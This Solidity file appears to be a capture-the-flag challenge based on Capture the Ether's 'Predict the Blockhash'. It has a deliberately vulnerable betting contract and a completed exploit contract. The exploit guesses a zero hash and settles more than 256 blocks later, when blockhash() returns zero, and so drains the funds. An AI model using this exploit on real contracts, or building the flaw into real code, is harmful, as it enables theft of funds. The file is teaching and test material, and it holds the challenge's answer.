// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console2.sol";

contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        console2.log("lockInGuess conc");
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        console2.log("settle entered");
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        // need to wait 2 more blocks
        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");
        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    function lockInGuess() public payable {
        bytes32 zero = bytes32(0);
        predictTheBlockhash.lockInGuess{value: 1 ether}(zero);
    }

    function attack() public {
        predictTheBlockhash.settle();
    }

    receive() external payable {}
}
